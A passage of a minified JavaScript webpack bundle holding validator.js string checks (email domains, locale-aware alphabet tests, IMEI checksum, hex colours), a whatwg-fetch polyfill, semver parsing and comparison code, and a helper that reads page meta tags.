              , s = ["icloud.com", "me.com"]
              , a = ["hotmail.at", "hotmail.be", "hotmail.ca", "hotmail.cl", "hotmail.co.il", "hotmail.co.nz", "hotmail.co.th", "hotmail.co.uk", "hotmail.com", "hotmail.com.ar", "hotmail.com.au", "hotmail.com.br", "hotmail.com.gr", "hotmail.com.mx", "hotmail.com.pe", "hotmail.com.tr", "hotmail.com.vn", "hotmail.cz", "hotmail.de", "hotmail.dk", "hotmail.es", "hotmail.fr", "hotmail.hu", "hotmail.id", "hotmail.ie", "hotmail.in", "hotmail.it", "hotmail.jp", "hotmail.kr", "hotmail.lv", "hotmail.my", "hotmail.ph", "hotmail.pt", "hotmail.sa", "hotmail.sg", "hotmail.sk", "live.be", "live.co.uk", "live.com", "live.com.ar", "live.com.mx", "live.de", "live.es", "live.eu", "live.fr", "live.it", "live.nl", "msn.com", "outlook.at", "outlook.be", "outlook.cl", "outlook.co.il", "outlook.co.nz", "outlook.co.th", "outlook.com", "outlook.com.ar", "outlook.com.au", "outlook.com.br", "outlook.com.gr", "outlook.com.pe", "outlook.com.tr", "outlook.com.vn", "outlook.cz", "outlook.de", "outlook.dk", "outlook.es", "outlook.fr", "outlook.hu", "outlook.id", "outlook.ie", "outlook.in", "outlook.it", "outlook.jp", "outlook.kr", "outlook.lv", "outlook.my", "outlook.ph", "outlook.pt", "outlook.sa", "outlook.sg", "outlook.sk", "passport.com"]
              , c = ["rocketmail.com", "yahoo.ca", "yahoo.co.uk", "yahoo.com", "yahoo.de", "yahoo.fr", "yahoo.in", "yahoo.it", "ymail.com"]
              , l = ["yandex.ru", "yandex.ua", "yandex.kz", "yandex.com", "yandex.by", "ya.ru"];
            function u(e) {
                return e.length > 1 ? e : ""
            }
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8478: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "en-US"
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                (0,
                o.default)(e);
                var n = e
                  , s = r.ignore;
                if (s)
                    if (s instanceof RegExp)
                        n = n.replace(s, "");
                    else {
                        if ("string" !== typeof s)
                            throw new Error("ignore should be instance of a String or RegExp");
                        n = n.replace(new RegExp("[".concat(s.replace(/[-[\]{}()*+?.,\\^$|#\\s]/g, "\\$&"), "]"),"g"), "")
                    }
                if (t in i.alpha)
                    return i.alpha[t].test(n);
                throw new Error("Invalid locale '".concat(t, "'"))
            }
            ,
            t.locales = void 0;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            }, i = r(7858);
            t.locales = Object.keys(i.alpha)
        }
        ,
        8540: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                (0,
                o.default)(e);
                var r = i;
                (t = t || {}).allow_hyphens && (r = s);
                if (!r.test(e))
                    return !1;
                e = e.replace(/-/g, "");
                for (var n = 0, a = 2, c = 0; c < 14; c++) {
                    var l = e.substring(14 - c - 1, 14 - c)
                      , u = parseInt(l, 10) * a;
                    n += u >= 10 ? u % 10 + 1 : u,
                    1 === a ? a += 1 : a -= 1
                }
                if ((10 - n % 10) % 10 !== parseInt(e.substring(14, 15), 10))
                    return !1;
                return !0
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /^[0-9]{15}$/
              , s = /^\d{2}-\d{6}-\d{6}-\d{1}$/;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8628: (e, t, r) => {
            const n = r(9398);
            e.exports = (e, t) => new n(e,t).minor
        }
        ,
        8683: (e, t, r) => {
            const n = r(2282);
            e.exports = (e, t) => {
                const r = n(e, t);
                return r && r.prerelease.length ? r.prerelease : null
            }
        }
        ,
        8729: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                if ((0,
                o.default)(e),
                t && t.no_symbols)
                    return s.test(e);
                return new RegExp("^[+-]?([0-9]*[".concat((t || {}).locale ? i.decimal[t.locale] : ".", "])?[0-9]+$")).test(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            }, i = r(7858);
            var s = /^[0-9]+$/;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8800: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e),
                i.test(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /^#?([0-9A-F]{3}|[0-9A-F]{4}|[0-9A-F]{6}|[0-9A-F]{8})$/i;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8804: (e, t) => {
            "use strict";
            function r(e) {
                return r = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                }
                : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                }
                ,
                r(e)
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                if (!("string" === typeof e || e instanceof String)) {
                    var t = r(e);
                    throw null === e ? t = "null" : "object" === t && (t = e.constructor.name),
                    new TypeError("Expected a string but received a ".concat(t))
                }
            }
            ,
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8853: (e, t, r) => {
            "use strict";
            e.exports = r(5896)
        }
        ,
        8951: (e, t) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.ONE_THOUSAND = t.ONE_HUNDRED = void 0,
            t.ONE_HUNDRED = 100,
            t.ONE_THOUSAND = 1e3
        }
        ,
        8999: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                return (0,
                o.default)(e),
                e.replace(new RegExp("[^".concat(t, "]+"),"g"), "")
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        9038: (e, t, r) => {
            var n = "undefined" !== typeof globalThis && globalThis || "undefined" !== typeof self && self || "undefined" !== typeof r.g && r.g
              , o = function() {
                function e() {
                    this.fetch = !1,
                    this.DOMException = n.DOMException
                }
                return e.prototype = n,
                new e
            }();
            !function(e) {
                !function(t) {
                    var n = "undefined" !== typeof e && e || "undefined" !== typeof self && self || "undefined" !== typeof r.g && r.g || {}
                      , o = "URLSearchParams"in n
                      , i = "Symbol"in n && "iterator"in Symbol
                      , s = "FileReader"in n && "Blob"in n && function() {
                        try {
                            return new Blob,
                            !0
                        } catch (e) {
                            return !1
                        }
                    }()
                      , a = "FormData"in n
                      , c = "ArrayBuffer"in n;
                    if (c)
                        var l = ["[object Int8Array]", "[object Uint8Array]", "[object Uint8ClampedArray]", "[object Int16Array]", "[object Uint16Array]", "[object Int32Array]", "[object Uint32Array]", "[object Float32Array]", "[object Float64Array]"]
                          , u = ArrayBuffer.isView || function(e) {
                            return e && l.indexOf(Object.prototype.toString.call(e)) > -1
                        }
                        ;
                    function d(e) {
                        if ("string" !== typeof e && (e = String(e)),
                        /[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(e) || "" === e)
                            throw new TypeError('Invalid character in header field name: "' + e + '"');
                        return e.toLowerCase()
                    }
                    function h(e) {
                        return "string" !== typeof e && (e = String(e)),
                        e
                    }
                    function f(e) {
                        var t = {
                            next: function() {
                                var t = e.shift();
                                return {
                                    done: void 0 === t,
                                    value: t
                                }
                            }
                        };
                        return i && (t[Symbol.iterator] = function() {
                            return t
                        }
                        ),
                        t
                    }
                    function p(e) {
                        this.map = {},
                        e instanceof p ? e.forEach((function(e, t) {
                            this.append(t, e)
                        }
                        ), this) : Array.isArray(e) ? e.forEach((function(e) {
                            if (2 != e.length)
                                throw new TypeError("Headers constructor: expected name/value pair to be length 2, found" + e.length);
                            this.append(e[0], e[1])
                        }
                        ), this) : e && Object.getOwnPropertyNames(e).forEach((function(t) {
                            this.append(t, e[t])
                        }
                        ), this)
                    }
                    function g(e) {
                        if (!e._noBody)
                            return e.bodyUsed ? Promise.reject(new TypeError("Already read")) : void (e.bodyUsed = !0)
                    }
                    function y(e) {
                        return new Promise((function(t, r) {
                            e.onload = function() {
                                t(e.result)
                            }
                            ,
                            e.onerror = function() {
                                r(e.error)
                            }
                        }
                        ))
                    }
                    function m(e) {
                        var t = new FileReader
                          , r = y(t);
                        return t.readAsArrayBuffer(e),
                        r
                    }
                    function b(e) {
                        if (e.slice)
                            return e.slice(0);
                        var t = new Uint8Array(e.byteLength);
                        return t.set(new Uint8Array(e)),
                        t.buffer
                    }
                    function v() {
                        return this.bodyUsed = !1,
                        this._initBody = function(e) {
                            var t;
                            this.bodyUsed = this.bodyUsed,
                            this._bodyInit = e,
                            e ? "string" === typeof e ? this._bodyText = e : s && Blob.prototype.isPrototypeOf(e) ? this._bodyBlob = e : a && FormData.prototype.isPrototypeOf(e) ? this._bodyFormData = e : o && URLSearchParams.prototype.isPrototypeOf(e) ? this._bodyText = e.toString() : c && s && ((t = e) && DataView.prototype.isPrototypeOf(t)) ? (this._bodyArrayBuffer = b(e.buffer),
                            this._bodyInit = new Blob([this._bodyArrayBuffer])) : c && (ArrayBuffer.prototype.isPrototypeOf(e) || u(e)) ? this._bodyArrayBuffer = b(e) : this._bodyText = e = Object.prototype.toString.call(e) : (this._noBody = !0,
                            this._bodyText = ""),
                            this.headers.get("content-type") || ("string" === typeof e ? this.headers.set("content-type", "text/plain;charset=UTF-8") : this._bodyBlob && this._bodyBlob.type ? this.headers.set("content-type", this._bodyBlob.type) : o && URLSearchParams.prototype.isPrototypeOf(e) && this.headers.set("content-type", "application/x-www-form-urlencoded;charset=UTF-8"))
                        }
                        ,
                        s && (this.blob = function() {
                            var e = g(this);
                            if (e)
                                return e;
                            if (this._bodyBlob)
                                return Promise.resolve(this._bodyBlob);
                            if (this._bodyArrayBuffer)
                                return Promise.resolve(new Blob([this._bodyArrayBuffer]));
                            if (this._bodyFormData)
                                throw new Error("could not read FormData body as blob");
                            return Promise.resolve(new Blob([this._bodyText]))
                        }
                        ),
                        this.arrayBuffer = function() {
                            if (this._bodyArrayBuffer) {
                                var e = g(this);
                                return e || (ArrayBuffer.isView(this._bodyArrayBuffer) ? Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset, this._bodyArrayBuffer.byteOffset + this._bodyArrayBuffer.byteLength)) : Promise.resolve(this._bodyArrayBuffer))
                            }
                            if (s)
                                return this.blob().then(m);
                            throw new Error("could not read as ArrayBuffer")
                        }
                        ,
                        this.text = function() {
                            var e = g(this);
                            if (e)
                                return e;
                            if (this._bodyBlob)
                                return function(e) {
                                    var t = new FileReader
                                      , r = y(t)
                                      , n = /charset=([A-Za-z0-9_-]+)/.exec(e.type)
                                      , o = n ? n[1] : "utf-8";
                                    return t.readAsText(e, o),
                                    r
                                }(this._bodyBlob);
                            if (this._bodyArrayBuffer)
                                return Promise.resolve(function(e) {
                                    for (var t = new Uint8Array(e), r = new Array(t.length), n = 0; n < t.length; n++)
                                        r[n] = String.fromCharCode(t[n]);
                                    return r.join("")
                                }(this._bodyArrayBuffer));
                            if (this._bodyFormData)
                                throw new Error("could not read FormData body as text");
                            return Promise.resolve(this._bodyText)
                        }
                        ,
                        a && (this.formData = function() {
                            return this.text().then(A)
                        }
                        ),
                        this.json = function() {
                            return this.text().then(JSON.parse)
                        }
                        ,
                        this
                    }
                    p.prototype.append = function(e, t) {
                        e = d(e),
                        t = h(t);
                        var r = this.map[e];
                        this.map[e] = r ? r + ", " + t : t
                    }
                    ,
                    p.prototype.delete = function(e) {
                        delete this.map[d(e)]
                    }
                    ,
                    p.prototype.get = function(e) {
                        return e = d(e),
                        this.has(e) ? this.map[e] : null
                    }
                    ,
                    p.prototype.has = function(e) {
                        return this.map.hasOwnProperty(d(e))
                    }
                    ,
                    p.prototype.set = function(e, t) {
                        this.map[d(e)] = h(t)
                    }
                    ,
                    p.prototype.forEach = function(e, t) {
                        for (var r in this.map)
                            this.map.hasOwnProperty(r) && e.call(t, this.map[r], r, this)
                    }
                    ,
                    p.prototype.keys = function() {
                        var e = [];
                        return this.forEach((function(t, r) {
                            e.push(r)
                        }
                        )),
                        f(e)
                    }
                    ,
                    p.prototype.values = function() {
                        var e = [];
                        return this.forEach((function(t) {
                            e.push(t)
                        }
                        )),
                        f(e)
                    }
                    ,
                    p.prototype.entries = function() {
                        var e = [];
                        return this.forEach((function(t, r) {
                            e.push([r, t])
                        }
                        )),
                        f(e)
                    }
                    ,
                    i && (p.prototype[Symbol.iterator] = p.prototype.entries);
                    var w = ["CONNECT", "DELETE", "GET", "HEAD", "OPTIONS", "PATCH", "POST", "PUT", "TRACE"];
                    function T(e, t) {
                        if (!(this instanceof T))
                            throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');
                        var r = (t = t || {}).body;
                        if (e instanceof T) {
                            if (e.bodyUsed)
                                throw new TypeError("Already read");
                            this.url = e.url,
                            this.credentials = e.credentials,
                            t.headers || (this.headers = new p(e.headers)),
                            this.method = e.method,
                            this.mode = e.mode,
                            this.signal = e.signal,
                            r || null == e._bodyInit || (r = e._bodyInit,
                            e.bodyUsed = !0)
                        } else
                            this.url = String(e);
                        if (this.credentials = t.credentials || this.credentials || "same-origin",
                        !t.headers && this.headers || (this.headers = new p(t.headers)),
                        this.method = function(e) {
                            var t = e.toUpperCase();
                            return w.indexOf(t) > -1 ? t : e
                        }(t.method || this.method || "GET"),
                        this.mode = t.mode || this.mode || null,
                        this.signal = t.signal || this.signal || function() {
                            if ("AbortController"in n)
                                return (new AbortController).signal
                        }(),
                        this.referrer = null,
                        ("GET" === this.method || "HEAD" === this.method) && r)
                            throw new TypeError("Body not allowed for GET or HEAD requests");
                        if (this._initBody(r),
                        ("GET" === this.method || "HEAD" === this.method) && ("no-store" === t.cache || "no-cache" === t.cache)) {
                            var o = /([?&])_=[^&]*/;
                            if (o.test(this.url))
                                this.url = this.url.replace(o, "$1_=" + (new Date).getTime());
                            else {
                                this.url += (/\?/.test(this.url) ? "&" : "?") + "_=" + (new Date).getTime()
                            }
                        }
                    }
                    function A(e) {
                        var t = new FormData;
                        return e.trim().split("&").forEach((function(e) {
                            if (e) {
                                var r = e.split("=")
                                  , n = r.shift().replace(/\+/g, " ")
                                  , o = r.join("=").replace(/\+/g, " ");
                                t.append(decodeURIComponent(n), decodeURIComponent(o))
                            }
                        }
                        )),
                        t
                    }
                    function E(e) {
                        var t = new p;
                        return e.replace(/\r?\n[\t ]+/g, " ").split("\r").map((function(e) {
                            return 0 === e.indexOf("\n") ? e.substr(1, e.length) : e
                        }
                        )).forEach((function(e) {
                            var r = e.split(":")
                              , n = r.shift().trim();
                            if (n) {
                                var o = r.join(":").trim();
                                try {
                                    t.append(n, o)
                                } catch (i) {
                                    console.warn("Response " + i.message)
                                }
                            }
                        }
                        )),
                        t
                    }
                    function P(e, t) {
                        if (!(this instanceof P))
                            throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');
                        if (t || (t = {}),
                        this.type = "default",
                        this.status = void 0 === t.status ? 200 : t.status,
                        this.status < 200 || this.status > 599)
                            throw new RangeError("Failed to construct 'Response': The status provided (0) is outside the range [200, 599].");
                        this.ok = this.status >= 200 && this.status < 300,
                        this.statusText = void 0 === t.statusText ? "" : "" + t.statusText,
                        this.headers = new p(t.headers),
                        this.url = t.url || "",
                        this._initBody(e)
                    }
                    T.prototype.clone = function() {
                        return new T(this,{
                            body: this._bodyInit
                        })
                    }
                    ,
                    v.call(T.prototype),
                    v.call(P.prototype),
                    P.prototype.clone = function() {
                        return new P(this._bodyInit,{
                            status: this.status,
                            statusText: this.statusText,
                            headers: new p(this.headers),
                            url: this.url
                        })
                    }
                    ,
                    P.error = function() {
                        var e = new P(null,{
                            status: 200,
                            statusText: ""
                        });
                        return e.ok = !1,
                        e.status = 0,
                        e.type = "error",
                        e
                    }
                    ;
                    var C = [301, 302, 303, 307, 308];
                    P.redirect = function(e, t) {
                        if (-1 === C.indexOf(t))
                            throw new RangeError("Invalid status code");
                        return new P(null,{
                            status: t,
                            headers: {
                                location: e
                            }
                        })
                    }
                    ,
                    t.DOMException = n.DOMException;
                    try {
                        new t.DOMException
                    } catch (I) {
                        t.DOMException = function(e, t) {
                            this.message = e,
                            this.name = t;
                            var r = Error(e);
                            this.stack = r.stack
                        }
                        ,
                        t.DOMException.prototype = Object.create(Error.prototype),
                        t.DOMException.prototype.constructor = t.DOMException
                    }
                    function S(e, r) {
                        return new Promise((function(o, i) {
                            var a = new T(e,r);
                            if (a.signal && a.signal.aborted)
                                return i(new t.DOMException("Aborted","AbortError"));
                            var l = new XMLHttpRequest;
                            function u() {
                                l.abort()
                            }
                            if (l.onload = function() {
                                var e = {
                                    statusText: l.statusText,
                                    headers: E(l.getAllResponseHeaders() || "")
                                };
                                0 === a.url.indexOf("file://") && (l.status < 200 || l.status > 599) ? e.status = 200 : e.status = l.status,
                                e.url = "responseURL"in l ? l.responseURL : e.headers.get("X-Request-URL");
                                var t = "response"in l ? l.response : l.responseText;
                                setTimeout((function() {
                                    o(new P(t,e))
                                }
                                ), 0)
                            }
                            ,
                            l.onerror = function() {
                                setTimeout((function() {
                                    i(new TypeError("Network request failed"))
                                }
                                ), 0)
                            }
                            ,
                            l.ontimeout = function() {
                                setTimeout((function() {
                                    i(new TypeError("Network request timed out"))
                                }
                                ), 0)
                            }
                            ,
                            l.onabort = function() {
                                setTimeout((function() {
                                    i(new t.DOMException("Aborted","AbortError"))
                                }
                                ), 0)
                            }
                            ,
                            l.open(a.method, function(e) {
                                try {
                                    return "" === e && n.location.href ? n.location.href : e
                                } catch (t) {
                                    return e
                                }
                            }(a.url), !0),
                            "include" === a.credentials ? l.withCredentials = !0 : "omit" === a.credentials && (l.withCredentials = !1),
                            "responseType"in l && (s ? l.responseType = "blob" : c && (l.responseType = "arraybuffer")),
                            r && "object" === typeof r.headers && !(r.headers instanceof p || n.Headers && r.headers instanceof n.Headers)) {
                                var f = [];
                                Object.getOwnPropertyNames(r.headers).forEach((function(e) {
                                    f.push(d(e)),
                                    l.setRequestHeader(e, h(r.headers[e]))
                                }
                                )),
                                a.headers.forEach((function(e, t) {
                                    -1 === f.indexOf(t) && l.setRequestHeader(t, e)
                                }
                                ))
                            } else
                                a.headers.forEach((function(e, t) {
                                    l.setRequestHeader(t, e)
                                }
                                ));
                            a.signal && (a.signal.addEventListener("abort", u),
                            l.onreadystatechange = function() {
                                4 === l.readyState && a.signal.removeEventListener("abort", u)
                            }
                            ),
                            l.send("undefined" === typeof a._bodyInit ? null : a._bodyInit)
                        }
                        ))
                    }
                    S.polyfill = !0,
                    n.fetch || (n.fetch = S,
                    n.Headers = p,
                    n.Request = T,
                    n.Response = P),
                    t.Headers = p,
                    t.Request = T,
                    t.Response = P,
                    t.fetch = S,
                    Object.defineProperty(t, "__esModule", {
                        value: !0
                    })
                }({})
            }(o),
            o.fetch.ponyfill = !0,
            delete o.fetch.polyfill;
            var i = n.fetch ? n : o;
            (t = i.fetch).default = i.fetch,
            t.fetch = i.fetch,
            t.Headers = i.Headers,
            t.Request = i.Request,
            t.Response = i.Response,
            e.exports = t
        }
        ,
        9040: (e, t, r) => {
            const {MAX_SAFE_COMPONENT_LENGTH: n, MAX_SAFE_BUILD_LENGTH: o, MAX_LENGTH: i} = r(5132)
              , s = r(3338)
              , a = (t = e.exports = {}).re = []
              , c = t.safeRe = []
              , l = t.src = []
              , u = t.safeSrc = []
              , d = t.t = {};
            let h = 0;
            const f = "[a-zA-Z0-9-]"
              , p = [["\\s", 1], ["\\d", i], [f, o]]
              , g = (e, t, r) => {
                const n = (e => {
                    for (const [t,r] of p)
                        e = e.split("".concat(t, "*")).join("".concat(t, "{0,").concat(r, "}")).split("".concat(t, "+")).join("".concat(t, "{1,").concat(r, "}"));
                    return e
                }
                )(t)
                  , o = h++;
                s(e, o, t),
                d[e] = o,
                l[o] = t,
                u[o] = n,
                a[o] = new RegExp(t,r ? "g" : void 0),
                c[o] = new RegExp(n,r ? "g" : void 0)
            }
            ;
            g("NUMERICIDENTIFIER", "0|[1-9]\\d*"),
            g("NUMERICIDENTIFIERLOOSE", "\\d+"),
            g("NONNUMERICIDENTIFIER", "\\d*[a-zA-Z-]".concat(f, "*")),
            g("MAINVERSION", "(".concat(l[d.NUMERICIDENTIFIER], ")\\.") + "(".concat(l[d.NUMERICIDENTIFIER], ")\\.") + "(".concat(l[d.NUMERICIDENTIFIER], ")")),
            g("MAINVERSIONLOOSE", "(".concat(l[d.NUMERICIDENTIFIERLOOSE], ")\\.") + "(".concat(l[d.NUMERICIDENTIFIERLOOSE], ")\\.") + "(".concat(l[d.NUMERICIDENTIFIERLOOSE], ")")),
            g("PRERELEASEIDENTIFIER", "(?:".concat(l[d.NUMERICIDENTIFIER], "|").concat(l[d.NONNUMERICIDENTIFIER], ")")),
            g("PRERELEASEIDENTIFIERLOOSE", "(?:".concat(l[d.NUMERICIDENTIFIERLOOSE], "|").concat(l[d.NONNUMERICIDENTIFIER], ")")),
            g("PRERELEASE", "(?:-(".concat(l[d.PRERELEASEIDENTIFIER], "(?:\\.").concat(l[d.PRERELEASEIDENTIFIER], ")*))")),
            g("PRERELEASELOOSE", "(?:-?(".concat(l[d.PRERELEASEIDENTIFIERLOOSE], "(?:\\.").concat(l[d.PRERELEASEIDENTIFIERLOOSE], ")*))")),
            g("BUILDIDENTIFIER", "".concat(f, "+")),
            g("BUILD", "(?:\\+(".concat(l[d.BUILDIDENTIFIER], "(?:\\.").concat(l[d.BUILDIDENTIFIER], ")*))")),
            g("FULLPLAIN", "v?".concat(l[d.MAINVERSION]).concat(l[d.PRERELEASE], "?").concat(l[d.BUILD], "?")),
            g("FULL", "^".concat(l[d.FULLPLAIN], "$")),
            g("LOOSEPLAIN", "[v=\\s]*".concat(l[d.MAINVERSIONLOOSE]).concat(l[d.PRERELEASELOOSE], "?").concat(l[d.BUILD], "?")),
            g("LOOSE", "^".concat(l[d.LOOSEPLAIN], "$")),
            g("GTLT", "((?:<|>)?=?)"),
            g("XRANGEIDENTIFIERLOOSE", "".concat(l[d.NUMERICIDENTIFIERLOOSE], "|x|X|\\*")),
            g("XRANGEIDENTIFIER", "".concat(l[d.NUMERICIDENTIFIER], "|x|X|\\*")),
            g("XRANGEPLAIN", "[v=\\s]*(".concat(l[d.XRANGEIDENTIFIER], ")") + "(?:\\.(".concat(l[d.XRANGEIDENTIFIER], ")") + "(?:\\.(".concat(l[d.XRANGEIDENTIFIER], ")") + "(?:".concat(l[d.PRERELEASE], ")?").concat(l[d.BUILD], "?") + ")?)?"),
            g("XRANGEPLAINLOOSE", "[v=\\s]*(".concat(l[d.XRANGEIDENTIFIERLOOSE], ")") + "(?:\\.(".concat(l[d.XRANGEIDENTIFIERLOOSE], ")") + "(?:\\.(".concat(l[d.XRANGEIDENTIFIERLOOSE], ")") + "(?:".concat(l[d.PRERELEASELOOSE], ")?").concat(l[d.BUILD], "?") + ")?)?"),
            g("XRANGE", "^".concat(l[d.GTLT], "\\s*").concat(l[d.XRANGEPLAIN], "$")),
            g("XRANGELOOSE", "^".concat(l[d.GTLT], "\\s*").concat(l[d.XRANGEPLAINLOOSE], "$")),
            g("COERCEPLAIN", "".concat("(^|[^\\d])(\\d{1,").concat(n, "})") + "(?:\\.(\\d{1,".concat(n, "}))?") + "(?:\\.(\\d{1,".concat(n, "}))?")),
            g("COERCE", "".concat(l[d.COERCEPLAIN], "(?:$|[^\\d])")),
            g("COERCEFULL", l[d.COERCEPLAIN] + "(?:".concat(l[d.PRERELEASE], ")?") + "(?:".concat(l[d.BUILD], ")?") + "(?:$|[^\\d])"),
            g("COERCERTL", l[d.COERCE], !0),
            g("COERCERTLFULL", l[d.COERCEFULL], !0),
            g("LONETILDE", "(?:~>?)"),
            g("TILDETRIM", "(\\s*)".concat(l[d.LONETILDE], "\\s+"), !0),
            t.tildeTrimReplace = "$1~",
            g("TILDE", "^".concat(l[d.LONETILDE]).concat(l[d.XRANGEPLAIN], "$")),
            g("TILDELOOSE", "^".concat(l[d.LONETILDE]).concat(l[d.XRANGEPLAINLOOSE], "$")),
            g("LONECARET", "(?:\\^)"),
            g("CARETTRIM", "(\\s*)".concat(l[d.LONECARET], "\\s+"), !0),
            t.caretTrimReplace = "$1^",
            g("CARET", "^".concat(l[d.LONECARET]).concat(l[d.XRANGEPLAIN], "$")),
            g("CARETLOOSE", "^".concat(l[d.LONECARET]).concat(l[d.XRANGEPLAINLOOSE], "$")),
            g("COMPARATORLOOSE", "^".concat(l[d.GTLT], "\\s*(").concat(l[d.LOOSEPLAIN], ")$|^$")),
            g("COMPARATOR", "^".concat(l[d.GTLT], "\\s*(").concat(l[d.FULLPLAIN], ")$|^$")),
            g("COMPARATORTRIM", "(\\s*)".concat(l[d.GTLT], "\\s*(").concat(l[d.LOOSEPLAIN], "|").concat(l[d.XRANGEPLAIN], ")"), !0),
            t.comparatorTrimReplace = "$1$2$3",
            g("HYPHENRANGE", "^\\s*(".concat(l[d.XRANGEPLAIN], ")") + "\\s+-\\s+" + "(".concat(l[d.XRANGEPLAIN], ")") + "\\s*$"),
            g("HYPHENRANGELOOSE", "^\\s*(".concat(l[d.XRANGEPLAINLOOSE], ")") + "\\s+-\\s+" + "(".concat(l[d.XRANGEPLAINLOOSE], ")") + "\\s*$"),
            g("STAR", "(<|>)?=?\\s*\\*"),
            g("GTE0", "^\\s*>=\\s*0\\.0\\.0\\s*$"),
            g("GTE0PRE", "^\\s*>=\\s*0\\.0\\.0-0\\s*$")
        }
        ,
        9085: (e, t, r) => {
            const n = r(9447)
              , o = r(9189)
              , i = r(1166)
              , s = r(2039)
              , a = r(7137)
              , c = r(18);
            e.exports = (e, t, r, l) => {
                switch (t) {
                case "===":
                    return "object" === typeof e && (e = e.version),
                    "object" === typeof r && (r = r.version),
                    e === r;
                case "!==":
                    return "object" === typeof e && (e = e.version),
                    "object" === typeof r && (r = r.version),
                    e !== r;
                case "":
                case "=":
                case "==":
                    return n(e, r, l);
                case "!=":
                    return o(e, r, l);
                case ">":
                    return i(e, r, l);
                case ">=":
                    return s(e, r, l);
                case "<":
                    return a(e, r, l);
                case "<=":
                    return c(e, r, l);
                default:
                    throw new TypeError("Invalid operator: ".concat(t))
                }
            }
        }
        ,
        9087: (e, t, r) => {
            const n = r(9040)
              , o = r(5132)
              , i = r(9398)
              , s = r(3029)
              , a = r(2282)
              , c = r(7807)
              , l = r(4240)
              , u = r(6849)
              , d = r(9526)
              , h = r(936)
              , f = r(8628)
              , p = r(2731)
              , g = r(8683)
              , y = r(4950)
              , m = r(6256)
              , b = r(9757)
              , v = r(4231)
              , w = r(5001)
              , T = r(7943)
              , A = r(1166)
              , E = r(7137)
              , P = r(9447)
              , C = r(9189)
              , S = r(2039)
              , I = r(18)
              , B = r(9085)
              , x = r(9488)
              , O = r(4426)
              , _ = r(77)
              , W = r(5024)
              , R = r(7805)
              , k = r(4770)
              , M = r(9496)
              , N = r(3411)
              , F = r(196)
              , U = r(1521)
              , D = r(1897)
              , L = r(3568)
              , j = r(7642)
              , z = r(1935)
              , V = r(3822);
            e.exports = {
                parse: a,
                valid: c,
                clean: l,
                inc: u,
                diff: d,
                major: h,
                minor: f,
                patch: p,
                prerelease: g,
                compare: y,
                rcompare: m,
                compareLoose: b,
                compareBuild: v,
                sort: w,
                rsort: T,
                gt: A,
                lt: E,
                eq: P,
                neq: C,
                gte: S,
                lte: I,
                cmp: B,
                coerce: x,
                Comparator: O,
                Range: _,
                satisfies: W,
                toComparators: R,
                maxSatisfying: k,
                minSatisfying: M,
                minVersion: N,
                validRange: F,
                outside: U,
                gtr: D,
                ltr: L,
                intersects: j,
                simplifyRange: z,
                subset: V,
                SemVer: i,
                re: n.re,
                src: n.src,
                tokens: n.t,
                SEMVER_SPEC_VERSION: o.SEMVER_SPEC_VERSION,
                RELEASE_TYPES: o.RELEASE_TYPES,
                compareIdentifiers: s.compareIdentifiers,
                rcompareIdentifiers: s.rcompareIdentifiers
            }
        }
        ,
        9148: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                n.default)(e),
                i.test(e)
            }
            ;
            var n = o(r(8804));
            function o(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var i = (0,
            o(r(4277)).default)(["^(0|[1-9]\\d*)\\.(0|[1-9]\\d*)\\.(0|[1-9]\\d*)", "(?:-((?:0|[1-9]\\d*|\\d*[a-z-][0-9a-z-]*)(?:\\.(?:0|[1-9]\\d*|\\d*[a-z-][0-9a-z-]*))*))", "?(?:\\+([0-9a-z-]+(?:\\.[0-9a-z-]+)*))?$"], "i");
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        9189: (e, t, r) => {
            const n = r(4950);
            e.exports = (e, t, r) => 0 !== n(e, t, r)
        }
        ,
        9332: (e, t, r) => {
            "use strict";
            t.g = void 0;
            const n = r(33);
            t.g = function() {
                let e, t;
                try {
                    e = n.getDocumentOrThrow(),
                    t = n.getLocationOrThrow()
                } catch (i) {
                    return null
                }
                function r() {
                    for (var t = arguments.length, r = new Array(t), n = 0; n < t; n++)
                        r[n] = arguments[n];
                    const o = e.getElementsByTagName("meta");
                    for (let e = 0; e < o.length; e++) {
                        const t = o[e]
                          , n = ["itemprop", "property", "name"].map((e => t.getAttribute(e))).filter((e => !!e && r.includes(e)));
                        if (n.length && n) {
                            const e = t.getAttribute("content");
                            if (e)
                                return e
